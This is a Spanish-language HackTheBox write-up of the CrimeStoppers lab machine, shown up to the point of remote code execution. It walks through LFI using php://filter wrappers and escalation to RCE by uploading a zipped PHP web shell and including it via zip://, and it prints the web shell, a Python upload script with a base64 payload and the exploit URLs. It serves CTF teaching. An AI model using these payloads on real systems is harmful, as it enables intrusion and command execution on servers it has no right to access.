---
layout      : post
title       : "HackTheBox - CrimeStoppers"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120banner.png
category    : [ htb ]
tags        : [ LFI, wrapper, reversing, rootkit, crypto, thunderbird ]
---
Máquina Linux nivel difícil. Explotación web con filtros (**wrappers**) consiguiendo **LFI** y **RCE**, contraseñas de **Thunderbird**, correos llenos de odio, persistencias locas (un **rootkit**) y jugueteo entre **reversing** y **criptografía**.

![120crimestoppersHTB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120crimestoppersHTB.png)

## TL;DR (Spanish writeup)

**Creada por**: [IppSec (diosito)](https://www.hackthebox.eu/profile/3769).

Virgencita lo que nos espera, los malos han ganado 😔

Encontraremos un servidor web para enviar información sobre unos ciberatacantes, jugando con la web se nos avisará que existe un parámetro vulnerable a `LFI (Local File Inclusion)` y a `RCE (Remote Command Execution)`, lo encontraremos, jugaremos con `wrappers` para leer los objetos de la web. Después de algo de enumeración entenderemos varios temas relacionados con la web y los reportes subidos. 

Para conseguir **RCE** tendremos que jugar de nuevo con un **wrapper**, esta vez el que esta relacionado con `zip://`, ¿pero para qué? bien, aprovecharemos la subida de los reportes para adjuntar en un campo de la trama el contenido (un `.php` con maldad dentro) de un archivo `.zip` para con ayuda del **wrapper** referenciarlo y leer el objeto **.php** que tiene dentro, ese archivo **.php** será el culpable de poder ejecutar comandos en el sistema como el usuario `www-data`.

🪕 [Script que automatiza la subida y genera **RCE**, <u>rceZIPwrapper.py</u>](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/crimestoppers/rceZIPwrapper.py)

Estando dentro jugaremos con el servicio `Thunderbird` para dumpear las contraseñas que guarda **Mozilla** en el sistema, esto para obtener credenciales válidas contra un usuario llamado `dom`.

Ya siendo **dom** vamos a encontrarnos de nuevo cositas de mails, en este caso vamos a leer unos correos algo tenebrosos, en uno de ellos se hace referencia a que **dom** encontró un `rootkit` en el sistema pero no esta seguro si esta en funcionamiento o no.

Tendremos que colocarnos en la posición del atacante, encontrar ese **rootkit** y sobre todo usarlo para conseguir una **Shell** como el usuario `root`. Peroooo, no será tan sencillo. Vamos a jugar un poquito con `reversing` y con `criptografia` para encontrar que los atacantes cambiaron la manera por default de usar el **rootkit** y agregaron su propia función que juega con `keys` y `XORs`.

Finalmente obtendremos la cadena con la que esta comparando la `key` y haremos funcionar correctamente el `rootkit`, ¿o sea? Obtendremos una sesión en el sistema como el usuario `root`.

...

#### Clasificación de la máquina

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 80%;"/>

Enumeración por montones, vulns conocidas y mucho más real de lo que creemos 👻

> Escribo para tener mis "notas", por si algún día se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y éxitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo mostrar lo que hice.

...

Es momento de cantar 🎶

1. [Reconocimiento](#reconocimiento).
  * [Enumeración de puertos con nmap](#enum-nmap).
2. [Enumeración](#enumeracion).
  * [Enumeramos servidor web en el puerto 80](#puerto-80).
3. [Explotación, encontramos **LFI**](#explotacion).
  * [Exploramos los archivos fuente de la web](#lfi-inspect-files)..
  * [Vamos de LFI a RCE usando el wrapper **zip://**](#lfi2rce-zip).
4. [Movimiento lateral - Thunderbird](#thunderbird-decrypt).
  * [Dumpeamos credenciales de Thunderbird con dos herramientas](#dump-thunderbird).
5. [Escalada de privilegios, jugamos con un **rootkit**](#escalada-de-privilegios).
  * [Encontramos **rootkit** en el sistema](#rootkit-found).
  * [Hacemos reversing hacia el **rootkit**, jugamos con **XOR** y desciframos como usar el backdoor](#rootkit-r2).
6. [Post explotación, logramos acceso **SSH** por **IPv6**](#ssh-ipv6).

...

# Reconocimiento [#](#reconocimiento) {#reconocimiento}

...

## Enumeración de puertos con nmap [📌](#enum-nmap) {#enum-nmap}

Como siempre, vamos a empezar descubriendo los puertos abiertos de la máquina, juguemos con `nmap` para eso:

```bash
❱ nmap -p- --open -v 10.10.10.80 -oG initScan
```

Pero el escaneo va moooooy lento, así que agregaremos el parámetro `--min-rate`:

```bash
❱ nmap -p- --open -v --min-rate=2000 10.10.10.80 -oG initScan
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p-          | Escanea todos los 65535                      |
| --open       | Solo los puertos que están abiertos          |
| -v           | Permite ver en consola lo que va encontrando |
| --min-rate=N | Le decimos que en cada petición que haga no envíe menos paquetes de N |
| -oG          | Guarda el output en un archivo con formato grepeable para usar la [función **extractPorts**](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que extrae los puertos en la clipboard |

Este escaneo nos devuelve un solo puerto abierto (***es importante validar de nuevo, ya que al ser un escaneo "forzado" pueda que `nmap` sobrepase algunos puertos***):

```bash
❱ cat initScan
# Nmap 7.80 scan initiated Sat Jul 31 25:25:25 2021 as: nmap -p- --open -v --min-rate=2000 -oG initScan 10.10.10.80
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.80 ()	Status: Up
Host: 10.10.10.80 ()	Ports: 80/open/tcp//http///	Ignored State: filtered (65534)
# Nmap done at Sat Jul 31 25:25:25 2021 -- 1 IP address (1 host up) scanned in 73.69 seconds
```

Tenemos:

| Puerto | Descripción |
| ------ | :---------- |
| 80     | **[HTTP](https://searchnetworking.techtarget.com/definition/port-80)**: Nos brinda un servidor web |

Al ser un solo puerto, no es necesario el uso de la función `extractPorts` (pero si no sabes el uso, en el 90% de writeups esta).

Ahora vamos a ver que versión y scripts tiene relacionado ese servicio web:

```bash
❱ nmap -p 80 -sC -sV 10.10.10.80 -oN portScan
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versión del servicio                |
| -oN       | Guarda el output en un archivo                         |

Y este escaneo nos devuelve:

```bash
❱ cat portScan
# Nmap 7.80 scan initiated Sat Jul 31 25:25:25 2021 as: nmap -p 80 -sC -sV -oN portScan 10.10.10.80
Nmap scan report for 10.10.10.80
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.25 ((Ubuntu))
|_http-server-header: Apache/2.4.25 (Ubuntu)
|_http-title: FBIs Most Wanted: FSociety

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jul 31 25:25:25 2021 -- 1 IP address (1 host up) scanned in 15.98 seconds
```

Bien, ¿qué vemos?:

| Puerto | Servicio | Versión |
| :----- | :------- | :------ |
| 80     | HTTP     | Apache/2.4.25 |

Y algo sobre el **FBI** 😨. Sabemos que si o si debemos explotar algo web, así que profundicemos y démosle a estoooooooooooooooooo.

...

# Enumeración [#](#enumeracion) {#enumeracion}

...

## Puerto 80 [📌](#puerto-80) {#puerto-80}

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120page80.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Varias cositas encontramos en la web inicial:

* Dos apartados arriba a la izquierda, el `home` y uno llamado `upload`.
* Nos muestra algunos ataques realizados por `fsociety`, podemos tenerlos en cuenta por si algo.
* Tenemos algunos nombres, quizás usuarios, no lo sabemos, guardémoslos.

Si visitamos el apartado `upload` vemos una **URL** medio interesante y un formulario para enviar información relacionada con algún miembro de `fsociety`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120page80_uploadForm.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

La **URL** con su formato `?op=` nos pone a pensar sobre algunas inyecciones, pero probando algunas básicas no vemos nada, sigamos.

Si llenamos los dos campos con info random:

* Information: `hola`
* Name: `elliot`

Enviamos la data y nos redirige a esta página:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120page80_view_withSHA1hash.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Jmmm, el valor `elliot` no lo vemos por ningún lado y solo nos devuelve la información que agregamos...

La **URL** va al recurso `view` y se genera otra variable llamada `secretname` con un hash tipo [SHA1](https://www.adslzone.net/2017/02/23/cifrado-sha-1-ya-no-seguro-google-lo-ha-roto-despues-22-anos/) que no importa lo que pongamos en los campos del formulario, siempre va a ser distinto (según las pruebas que he hecho hasta ahora e.e).

Revisando el código fuente del recurso `upload` vemos un comentario bastante llamativo:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120page80_upload_htmlCode.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

:o Una referencia a una vulnerabilidad tipo `SQL injection` en algo llamado `Tip`, curiosamente debajo vemos un campo de texto con id `tip`, jmmm, interesantísimo. Parece que ha sido removido ese campo en el viaje a la base de datos y se crea un archivo con él (no me quedo claro), pero igual podemos probar después.

Sigamos con `BurpSuite` así interceptamos las peticiones y vemos como viajan la data:

---

## <u>BurpSuite</u>, interceptamos peticiones y 👀 cositas [📌](#page80-burp) {#page80-burp}

Inicialmente jugaremos con el `home`, probemos tu vista, ¿ves algo interesante?:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120burp_home.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

¿Lo viste? En nuestro header `Cookie` existe una llamada `admin` y tiene el valor `0`, como indicando que no somos **admin**, pues podemos jugar ya sea con el propio `BurpSuite`, un editor de cookies o con el propio navegador web para cambiar esa cookie al valor `1`, quizás nos convierta en admin o quizás no, probemos:

Usaré la extensión [CookieManager](https://www.google.com/search?client=firefox-b-d&q=cookiemanager) en `Firefox` para cambiar ese valor, actualizamos la página web yyyyyyyyyyyyy junto a `home` y `upload` vemos un nuevo recurso:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120page80_asAdmin.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Opaa, el apartado `list`, pues veámoslo:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120page80_asAdmin_list.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Tenemos tooodos los archivos que se han creado, ya que si damos clic en cualquiera vemos nuestros `"hola"` y las distintas pruebas que hicimos antes, pero claro, hay un objeto distinto a los demás: `whiterose.txt`, veamos su contenido:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120page80_asAdmin_view_whiterose.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Encontramos un regaño de alguien contra los desarrolladores, les indica que uno de los parámetros enviados por el método `GET` (los que vemos en la URL) contiene una vulnerabilidad que inicialmente le deja ver el código fuente de algunos objetos, pero hay una prueba que le permitió **ejecutar comandos remotamente** 😯

También vemos un email del cual si extraemos el dominio `DarkArmy.htb`, podríamos probar el agregarlo al archivo [/etc/hosts](https://www.ionos.es/digitalguide/servidores/configuracion/archivo-hosts/) y ver si la resolución entre `10.10.10.80  DarkArmy.htb` nos devuelve algo distinto a la web que ya enumeramos desde el inicio (que no tendría mucho sentido, ya que es un usuario X con un email X, pero pues podemos probar).

> Pero no, no cambia, así que sigamos con lo encontrado antes...

...

***Es un mensaje para el equipo de desarrollo, pero también es para nosotros, nos dice que existe un campo `GET` vulnerable, también que ese campo le permite ver en código fuente de los archivos (puede ser el parámetro `secretname` ya que es el indicador de cuál archivo queremos ver en la web), así que primero enfoquémonos en encontrar un campo que al ser vulnerado lea los fuentes del sistema (`LFI`) y ya después nos volcamos al `RCE` 🚀***.

...

# Explotación, encontramos el parámetro vulnerable [#](#explotacion) {#explotacion}

🤯 ***Una vulnerabilidad tipo [LFI (Local File Inclusion)](https://www.netspi.com/blog/technical/web-application-penetration-testing/directory-traversal-file-inclusion-proc-file-system/) nos permite básicamente leer archivos a los cuales no deberíamos tener acceso (que están fuera de los objetos que usa la web), por ejemplo los del sistema.***

Después de muchas pruebas que me tenían como un 🧟  encontramos algo. 😊

Intentando enumerar ya sea el archivo `/etc/passwd` o alguno de los objetos que se referencian en la web (como `list` o `list.php`) usando el parámetro `secretname`, nada, no conseguimos respuesta alguna.

Moviéndonos entre parámetros solo nos quedaría uno, `op`, pues intentemos ahora el `LFI` ahí:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120page80_op_etcPasswd_withoutDOTS.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Pero nada, vemos `Error`... Pero podemos probar más cosas, como por ejemplo intentar movernos de carpetas del sistema e ir buscando el archivo `/etc/passwd` (o lo dicho antes, los objetos de la web), esto es sencillo, simplemente vamos saliéndonos de los directorios usando `../`, por lo que cada repetición de esa cadena es un directorio atrás.

Vayámonos bieeeeeen a la raíz del sistema y busquemos `../../../../../etc/passwd`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120page80_op_etcPasswd_DOTS.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Jmmmm, es un mensaje juguetón, probando cosas vemos que el mensaje sale cuando se envían dos puntos en la cadena. Siguiendo [este post](https://book.hacktricks.xyz/pentesting-web/file-inclusion) vemos algunas pruebas contra los `LFI`, probando y probando llegamos a la [sección de wrappers](https://book.hacktricks.xyz/pentesting-web/file-inclusion#lfi-rfi-using-php-wrappers), que serian como códigos adicionales que le indican a la web como queremos que se maneje la petición. [<u>Más info de wrappers</u>](https://diego.com.es/streams-en-php).

En la sección de **wrappers** existe uno que me gusta mucho:

```php
php://filter/convert.base64-encode/resource=index.php
```

Lo que hace es tomar el contenido del archivo `index.php` y codificarlo a `base64`, esto para mostrar por pantalla toooda la cadena encodeada. Es muy usado en este tipo de ataques, ya que muchas veces al intentar leer el contenido de un archivo `.php` sin un **wrapper** el contenido será interpretado más no mostrado. Ahí es cuando nos salvan los **wrappers**.

Intentando cositas como:

```php
http://10.10.10.80/?op=php://filter/convert.base64-encode/resource=/etc/passwd
// O encodeando los puntos:
http://10.10.10.80/?op=php://filter/convert.base64-encode/resource=%252e%252e%252fetc%252fpasswd
```

No logramos la explotación 😥 peeeeeeeeeeeeeeeeeeeero, si en vez de archivos del sistema intentamos jugar con los objetos usados por la web nos cambia la cara: 😮

**F**:

```php
http://10.10.10.80/?op=php://filter/convert.base64-encode/resource=list.php
```

**Tamo**:

```php
http://10.10.10.80/?op=php://filter/convert.base64-encode/resource=list
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120page80_LFIwrapperb64_list_DONE.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Vemos una cadena en `base64` gigante, tomémosla y decodifiquémosla:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120bash_LFI_decodeB64_listPHP.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Listones, podemos hacer esto mismo con los demás recursos o crearnos un script que simplemente tome el archivo que queremos ver y en su lógica lo decodee y nos lo muestre, ahí les dejo la tarea (:

---

## Exploramos los códigos fuente usados por la web [📌](#lfi-inspect-files) {#lfi-inspect-files}

Encontramos el mensaje al intentar `..` y al jugar con null bytes (`%00`), además el `include` que es el que implementa el valor de `$op` (le agrega el `.php`) en la web:

```php
<?php
...
$op = empty($_GET['op']) ? 'home' : $_GET['op'];
if(!is_string($op) || preg_match('/\.\./', $op) || preg_match('/\0/', $op))
    die('Are you really trying ' . htmlentities($op) . '!?  Did we Time Travel?  This isn\'t the 90\'s');
...
...
...
if(!(include $op . '.php'))
    fatal('no such page');
?>
```

> Por eso si intentabamos buscar `upload.php` terminaría la función incluyendo `upload.php.php`, y claramente ese objeto no existe.

* [Diferencia entre **file_get_contents()** e **include()**](https://infinitelogins.com/2020/11/21/exploiting-php-based-lfi/).

Sigamos...

Nos encontramos el objeto que hace la subida de los archivos, `upload.php`:

```php
<?php
include 'common.php';

// Stop the automated tools from filling up our ticket system.
session_start();
if (empty($_SESSION['token'])) {
    $_SESSION['token'] = bin2hex(openssl_random_pseudo_bytes(32));
}
$token = $_SESSION['token'];

$client_ip = $_SERVER['REMOTE_ADDR']; 

// If this is a submission, write $tip to file.

if(isset($_POST['submit']) && isset($_POST['tip'])) {
    // CSRF Token to help ensure this user came from our submission form.
    if (!empty($_POST['token'])) {
        if (hash_equals($token, $_POST['token'])) {
            $_SESSION['token'] = bin2hex(openssl_random_pseudo_bytes(32));
            // Place tips in the folder of the client IP Address.
            if (!is_dir('uploads/' . $client_ip)) {
                mkdir('uploads/' . $client_ip, 0755, false);
            }
            $tip = $_POST['tip'];
            $secretname = genFilename();
            file_put_contents("uploads/". $client_ip . '/' . $secretname,  $tip);
            header("Location: ?op=view&secretname=$secretname");
        } 
        else {
            print 'Hacker Detected.';
            print $token;
            die();
        }
    }
} 
else {
?>
...
```

Vemos que extrae nuestra IP y con ella genera un directorio para guardar los archivos, algo así: `uploads/10.10.14.5`.

También notamos algo interesante (lo que nos indicaba en el comentario del HTML que vimos hace un rato), el contenido del archivo que vamos a crear el enviado por la variable `$_POST['tip'];`. Así que ya sabríamos donde sube los objetos y como controlar su contenido, pero el nombre es un poco distinto, lo genera con la función `genFilename()` del objeto `common.php` y es guardado en la variable `$secretname`. Veamos `common.php`:

```php
<?php
/* Stop hackers. */
if(!defined('FROM_INDEX')) die();

// If the hacker cannot control the filename, it's totally safe to let them write files... Or is it?
function genFilename() {
    return sha1($_SERVER['REMOTE_ADDR'] . $_SERVER['HTTP_USER_AGENT'] . time() . mt_rand());
}

?>
```

Bien, es una concatenación de cadenas, nuestra IP, el contenido del `User-Agent`, el tiempo en que la petición fue enviada y un numero random. Tooodo eso forma una cadena que será convertida en un hash `SHA1`, ese hash será el nombre de nuestro archivo, esta hecho así para que no podamos cambiar el nombre del objeto (como bien dice el comentario).

Pero no estamos del todo perdidos, tenemos la posibilidad de escribir lo que queramos en ese archivo, nos queda mirar **QUÉ** escribir para lograr la explotación.

...

Con nuestras pruebas anteriores vimos un **wrapper** con una descripción interesante:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120google_xyz_wrapperZIPdesc.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

> Tomada de: [hacktricks.xyz - **Wrapper zip://**](https://book.hacktricks.xyz/pentesting-web/file-inclusion#wrapper-zip).

Nos indica que podemos intentar subir un archivo `.zip` (simplemente le cambia la extensión a `.jpg`, podemos probar de las dos maneras) con contenido dentro, por ejemplo un `.php` para después desde el parámetro vulnerable jugar con el **wrapper `zip://`** e intentar leer el archivo comprimido y con `%23` (`#` en URLencode) hacer referencia a algún objeto que este dentro de ese comprimido, así, conseguiríamos por ejemplo hacer que un objeto `.php` sea interpretado, pues intentemos:

* [Local File Inclusion (LFI) – Cheat Sheet](https://ironhackers.es/herramientas/lfi-cheat-sheet/).
* [Leveraging LFI to RCE using **zip://**](https://www.corben.io/zip-to-rce-lfi/).

...

## De <u>LFI</u> a <u>RCE</u> con wrapper <u>zip://</u> [📌](#lfi2rce-zip) {#lfi2rce-zip}

Entonces, debemos hacer esto:

1. [Generar un archivo **<u>.php</u>** con el contenido que queramos](#lfi2rce-zip1).
2. [Comprimir ese archivo **<u>.php</u>** en un archivo **<u>.zip</u>**](#lfi2rce-zip2).
3. [Usar el campo **<u>tip</u>** (si recordamos ese campo contiene la data que se guardara en el contenido del archivo) para enviar el contenido del **<u>.zip</u>](#lfi2rce-zip3).
4. [Jugar con el wrapper **<u>zip://</u>** para leer el objeto **<u>.zip</u>** y después referenciar al archivo **<u>.php</u>** con el símbolo **#** (URLencodeado seria **%23**)](#lfi2rce-zip4).
  * Volviendo a revisar el código sabemos que los archivos subidos se están guardando con en esta ruta: `uploads/nuestra_ip/nombre_SHA1_archivo`. Esto es importante para que nuestro wrapper pueda encontrar el objeto comprimido, ya lo veremos en práctica.

Pues listos, empecemos...

<span id="lfi2rce-zip1" style="color: yellow;">1. </span>Generamos archivo `.php`.

Un simple archivo que tome una variable (llamada `xmd`) enviada por el método `GET` y que su contenido sea ejecutado en el sistema usando la función `system()`:

```php
❱ cat hola.php 
<?php system($_GET['xmd']); ?>
```

<span id="lfi2rce-zip2" style="color: yellow;">2. </span>Comprimimos el objeto `.php` y generamos un `.zip`.

Simplemente ejecutamos:

```bash
❱ zip acata.zip hola.php 
  adding: hola.php (stored 0%)
```

*(Podemos tomar el `.zip` y renombrarlo a `.jpg`, pero yo lo copiaré para en caso de que el `.zip` no nos funcione probar con el `.jpg`)*

Se genera el archivo `acata.zip` y en su contenido esta el archivo `hola.php`.

<span id="lfi2rce-zip3" style="color: yellow;">3. </span>Subimos el contenido del `.zip` a la web.

Usaremos **BurpSuite** para esto, ya que estaremos jugando con bytes, saltos de línea y símbolos extraños, así evitaremos que un simple espacio (por ejemplo al copiar y pegar en el campo de la web) nos dañe el archivo.

Entonces, abrimos Burp, vamos al recurso `upload`, activamos el proxy, interceptamos con **Burp** yyyyyyyyy borramos el contenido que tenga el campo `tip`, lo dejamos vacío.

Ahora para pegar el contenido del archivo `.zip` podemos hacerlo de varias maneras, jugaremos con una de ellas:

* ***Ejecutar*** `cat acata.zip | base64 -w 0`***, tomar la cadena en `base64` y pegarla en el campo `tip`.***

  <img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120burp_zipFileTIP_base64.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

  Lo siguiente será volver a seleccionar esa cadena pero ahora en **Burp**, dar clic derecho y seguir esta ruta: 
  
    * `Convert Selection` > `Base64` > `Base64-decode`.
    * De la forma corta: `CTRL+SHIFT+B`.
    
  Y deberíamos ver algo así:

  <img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120burp_zipFileTIP_base64decode.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

  Damos clic en `forward`, nos debería llevar al recurso `view` y **veríamos el hash del archivo que generamos**, lo copiamos y damos de nuevo a `forward`. Ya debería estar nuestro archivo subido...

  <img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120burp_zipFileTIP_base64_uploadedVIEW.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Algo que descubrí es que desde la web tenemos acceso a `uploads/nuestra_ip/nombre_SHA1_archivo` y se nos descarga ese archivo, o si queremos ver tooodos los objetos subidos simplemente quitamos el hash:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120page80_uploadsIP_listFiles.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Bien, podemos descargar el objeto y ver si esta siendo subido con el formato de "comprimido":

```bash
❱ file 080b0c55f8b278c18430a49a19cdd7410f160dc4 
080b0c55f8b278c18430a49a19cdd7410f160dc4: Zip archive data, at least v1.0 to extract
```

Opa, pues sí, aprovechemos y validemos la integridad del archivo, así sabemos si contiene exactamente el contenido original, o sea, el contenido de `acata.zip`:

```bash
❱ md5sum *.zip
fb8b9eeae8f174cf3e27457e44672411  080b0c55f8b278c18430a49a19cdd7410f160dc4.zip
ad1e77bf2c8214b174b083f9ea0b0c97  acata.zip
```

Pues no, son distintos :( ¿y esto nos afecta? ¿Qué dices tú? 🤔 pos claro, ya que seguramente el archivo este roto y no nos funcione la explotación, podemos validarlo de dos formas, una es intentar descomprimir el objeto `08....zip`:

```bash
❱ unzip 080b0c55f8b278c18430a49a19cdd7410f160dc4.zip 
Archive:  080b0c55f8b278c18430a49a19cdd7410f160dc4.zip
warning [080b0c55f8b278c18430a49a19cdd7410f160dc4.zip]:  10 extra bytes at beginning or within zipfile
  (attempting to process anyway)
error [080b0c55f8b278c18430a49a19cdd7410f160dc4.zip]:  start of central directory not found;
  zipfile corrupt.
  (please check that you have transferred or created the zipfile in the
  appropriate BINARY mode and that you have compiled UnZip properly)
```

Vemos que no es válido :(

O probar de igual forma la explotación, intentemos primero localizar el objeto `080b0c55f8b278c18430a49a19cdd7410f160dc4` con el **wrapper**:

```html
http://10.10.10.80/?op=zip://uploads/10.10.14.6/080b0c55f8b278c18430a49a19cdd7410f160dc4
```

```html
http://10.10.10.80/?op=zip://uploads/10.10.14.6/080b0c55f8b278c18430a49a19cdd7410f160dc4%23hola.php
```

Pero recuerda que el parámetro `op` incluye la extensión `.php` por si solo, así que debemos probar así:

```html
http://10.10.10.80/?op=zip://uploads/10.10.14.6/080b0c55f8b278c18430a49a19cdd7410f160dc4%23hola
```

Pasándole el parámetro que recibe el archivo `hola.php`:

```html
http://10.10.10.80/?op=zip://uploads/10.10.14.6/080b0c55f8b278c18430a49a19cdd7410f160dc4%23hola&xmd=id
```

Pero nada, todos nos responden:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120page80_ZIPwrapper_error.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

😔 ***Así que F, hay algo en el envío que corrompe nuestro archivo y no permite que se suba correctamente (técnicamente hablando: jodiéndonos la integridad del mismo).***

<span id="lfi2rce-zip4" style="color: yellow;">4. </span>Logramos la subida correctamente y jugamos con el wrapper `zip://`.

Después de mover, quitar, lavarme la cara a ver si es que estaba dormido y no vi algo, etc. Después de un tiempo se me ocurrió hacer exactamente lo mismo que con **Burp**, enviar el contenido del `.zip` en una cadena en **base64** peeeeero desde un script en **Python**, que el mismo se encargue de jugar con los `bytes` y demás temitas. 

Entonces la idea es que el script tome la cadena en **base64**, la decode a `bytes` y haga el envió sobre el campo de texto `tip` (si nos fijamos en la petición que hicimos con **Burp** no estamos subiendo un archivo como tal (no existe `filename` o `Content-Type` en el campo `tip`), estamos pasando un texto que al estar dentro de un archivo dará formato a un objeto `.zip`). 

🙌 ***Con esta prueba logramos que la data del archivo viaje sin problemas y que una vez validamos la integridad los dos archivos sean iguales :)***

Este es el fragmento del script que hace la subida:

```py
...
session = requests.Session()

# - Extraemos token de sesion para poder subir un archivo
r = session.get(URL, params={"op":"upload"})
soup = BeautifulSoup(r.content, "html.parser")

token_value = soup.find(attrs={"name": "token"})["value"]

# - Subimos contenido del archivo .zip
zip_file_b64 = "UEsDBAoAAAAAAMxRA1N1AJ8mHwAAAB8AAAAIABwAaG9sYS5waHBVVAkAA09dCWFPXQlhdXgLAAEE6AMAAAToAwAAPD9waHAgc3lzdGVtKCRfR0VUWyd4bWQnXSk7ID8+ClBLAQIeAwoAAAAAAMxRA1N1AJ8mHwAAAB8AAAAIABgAAAAAAAEAAACkgQAAAABob2xhLnBocFVUBQADT10JYXV4CwABBOgDAAAE6AMAAFBLBQYAAAAAAQABAE4AAABhAAAAAAA="
# Pasamos de base64 a bytes
zip_file_bytes = zip_file_b64.encode('utf-8')
zip_file = base64.decodebytes(zip_file_bytes)

data_post = {
    "tip": zip_file,
    "name": "hola",
    "token": token_value,
    "submit": "Send Tip!"
}
r = session.post(URL, params={"op":"upload"}, data=data_post)

# Extraemos el nombre del archivo generado (el hash)
secretname = r.url.split('=')[2]
print(secretname)
...
```

Por si no me crees sobre que va en la cadena **base64** e.e

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120bash_script_ZIPbase64_echo.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Si lo ejecutamos tendríamos este nombre de archivo:

```bash
❱ python3 rceZIPwrapper.py 
7aaa6229865be1a673429fe1df2d9317bea8e863
```

Validamos integridad:

```bash
❱ curl http://10.10.10.80/uploads/10.10.14.6/7aaa6229865be1a673429fe1df2d9317bea8e863 -o 7aaa6229865be1a673429fe1df2d9317bea8e863
❱ file 7aaa6229865be1a673429fe1df2d9317bea8e863 
7aaa6229865be1a673429fe1df2d9317bea8e863: Zip archive data, at least v1.0 to extract
❱ mv 7aaa6229865be1a673429fe1df2d9317bea8e863 7aaa6229865be1a673429fe1df2d9317bea8e863.zip
❱ md5sum *.zip
ad1e77bf2c8214b174b083f9ea0b0c97  7aaa6229865be1a673429fe1df2d9317bea8e863.zip
ad1e77bf2c8214b174b083f9ea0b0c97  acata.zip
```

Perfectisimooooo, son iguales, así que su contenido también es igual, por lo queeeeeeeeeeeeeee:

```html
http://10.10.10.80/?op=zip://uploads/10.10.14.6/7aaa6229865be1a673429fe1df2d9317bea8e863
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120page80_ZIPwrapperUPdone_FindZIPerror.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Peeeeeero si referenciamos algún archivo que tenga dentrooooo:

```html
http://10.10.10.80/?op=zip://uploads/10.10.14.6/7aaa6229865be1a673429fe1df2d9317bea8e863%23hola
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120page80_ZIPwrapperUPdone_FindZIPdone.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Desaparece el errooooooooooooooooooooooooooor...

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120google_gif_froganxious.gif" style="display: block; margin-left: auto; margin-right: auto; width: 70%;"/>

YYYYYYYYYYYYY si le pasamos el parámetro `xmd` con algún comando, ejemplo `id`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120page80_ZIPwrapperUPdone_FindZIPdone_RCEid.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

